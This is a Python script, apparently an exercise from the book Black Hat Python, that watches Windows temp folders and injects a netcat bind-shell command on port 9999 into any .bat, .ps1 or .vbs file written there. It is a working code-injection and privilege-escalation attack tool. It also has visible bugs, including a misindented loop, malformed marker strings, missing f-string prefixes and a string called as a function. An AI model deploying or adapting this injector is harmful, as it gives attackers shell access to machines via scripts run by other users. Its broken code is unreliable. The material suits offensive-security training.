#!/usr/bin/env python
"""
Code Injection (file monitor version 2)
BHP page 164

Note: create executable from netcat.py
# pyinstaller -F netcat.py

"""

import os
import tempfile
import threading
import win32con
import win32file

FILE_CREATED = 1
FILE_DELETED = 2
FILE_MODIFIED = 3
FILE_RENAMED_FROM = 4
FILE_RENAMED_TO = 5

NETCAT = 'c:\\users\tim\work\\netcat.exe'
TGT_IP = '192.168.1.208'
CMD = f'{NETCAT} -t {TGT_IP} -p 9999 -l -c'


FILE_TYPES = {
    '.bat': ["r\nREM bhpmarker\r\n", r'\r\n{CMD}'],
    '.ps1': ["\r\n#bhpmarker\r\n", f'\r\nStart-Process "{CMD}"\r\n'],
    '.vbs': ["\r]n[bhpmarker\r\n",
             f'\r\nnCreateObject("Wscript.shell").Run({CMD}")\r\n'], }


def inject_code(full_filename, contents, extension):
    if FILE_TYPES[extension][0].strip() in contents():
        return

    full_contents = FILE_TYPES[extension][0]
    full_contents += FILE_TYPES[extension][1]
    full_contents += contents
    with open(full_filename, 'w') as f:
        f.write(full_contents)
    print('\\o/ Injected Code')


FILE_LIST_DIRECTORY = 0x0001
PATHS = ['c:\\WINDOWS\\Temp', tempfile.gettempdir()]


def monitor(path_to_watch):
    h_directory = win32file.CreateFile(
        path_to_watch,
        FILE_LIST_DIRECTORY,
        win32con.FILE_SHARE_READ | win32con.FILE_SHARE_WRITE |
        win32con.FILE_SHARE_DELETE,
        None,
        win32con.OPEN_EXISTING,
        win32con.FILE_FLAG_BACKUP_SEMANTICS,
        None
    )
               while True:
        try:
            results = win32file.ReadDirectoryChangesW(
                h_directory,
                1024,
                True,
                win32con.FILE_NOTIFY_CHANGE_ATTRIBUTES |
                win32con.FILE_NOTIFY_CHANGE_DIR_NAME |
                win32con.FILE_NOTIFY_CHANGE_FILE_NAME |
                win32con.FILE_NOTIFY_CHANGE_LAST_WRITE |
                win32con.FILE_NOTIFY_CHANGE_SECURITY |
                win32con.FILE_NOTIFY_CHANGE_SIZE,
                None,
                None
            )
            for action, file_name in results:
                full_filename = os.path.join(path_to_watch, file_name)
                if action == FILE_CREATED:
                    print(f'[+] Created {full_filename}')
                elif action == FILE_DELETED:
                    print(f'[-] Deleted {full_filename}')
                elif action == FILE_MODIFIED:
                    print(f'[*] Modified {full_filename}')
                    extension = os.path.splitext(full_filename)[1]
                    if extension in FILE_TYPES:
                        try:
                            with open(full_filename) as f:
                                contents = f.read()
                            print('[vvv] Dumping contents ... ')
                            inject_code(full_filename, contents, extension)
                            # print(contents)
                            print('[^^^] Dump complete.')
                        except Exception as e:
                            print('[!!!] dump failed. {e}')
                elif action == FILE_RENAMED_FROM:
                    print(f'[>] Renamed from {full_filename}')
                elif action == FILE_RENAMED_TO:
                    print(f'[<] Renamed to {full_filename}')
                else:
                    print(f'[?] Unknown action on {full_filename}')
        except Exception:
            pass


if __name__ == '__main__':
    for path in PATHS:
        monitor_thread = threading.Thread(target=monitor, args=(path,))
        monitor_thread.start()